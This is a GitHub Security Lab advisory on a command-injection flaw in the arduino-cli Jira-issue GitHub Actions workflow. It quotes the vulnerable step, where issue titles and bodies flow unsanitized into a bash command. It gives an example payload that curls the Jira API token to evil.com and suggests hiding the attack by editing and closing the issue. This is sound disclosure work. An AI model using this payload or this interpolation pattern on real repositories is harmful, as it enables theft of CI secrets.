<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-171: Command injection in arduino/arduino-cli workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/14/2020: Report sent to vendor</li>
  <li>10/15/2020: Vendor acknowledges report receipt</li>
  <li>10/16/2020: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/arduino/arduino-cli/blob/master/.github/workflows/jira-issue.yaml">‘Jira-issue’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/arduino/arduino-cli">Arduino-Cli GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/arduino/arduino-cli/blob/master/.github/workflows/jira-issue.yaml">Jira-issue.yaml</a> from the Master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-title-and-body-of-a-public-github-issue-are-used-to-format-a-shell-command">Issue: The title and body of a public GitHub issue are used to format a shell command</h3>

<p>When a user creates a public issue it automatically starts the <a href="https://github.com/arduino/arduino-cli/blob/master/.github/workflows/jira-issue.yaml">Jira-issue.yaml</a> GitHub workflow. The title and body of the issue are used without sanitization to format a bash script that invokes Jira.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      - name: Create issue
        run: |
          jira create <span class="se">\</span>
          <span class="nt">--noedit</span> <span class="se">\</span>
          <span class="nt">-p</span> <span class="k">${</span><span class="p">{ secrets.JIRA_PROJECT_CODE </span><span class="k">}</span><span class="o">}</span> <span class="se">\</span>
          <span class="nt">-i</span> Task <span class="se">\</span>
          <span class="nt">-o</span> <span class="nv">summary</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="p">{ github.event.issue.title </span><span class="k">}</span><span class="s2">}"</span> <span class="se">\</span>
          <span class="nt">-o</span> <span class="nv">description</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="p">{ github.event.issue.body </span><span class="k">}</span><span class="s2">}
          </span><span class="k">${</span><span class="p">{ github.event.issue.html_url </span><span class="k">}</span><span class="s2">}"</span> <span class="se">\</span>
          <span class="o">&gt;&gt;</span> output
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may create an issue with the title <code class="language-plaintext highlighter-rouge">It doesn't work on my machine</code> and body <code class="language-plaintext highlighter-rouge">`curl http://evil.com?$JIRA_API_TOKEN`</code> which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the body of the issue to <code class="language-plaintext highlighter-rouge">Never mind my bad.</code> and close it.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-171</code> in any communication regarding this issue.</p>
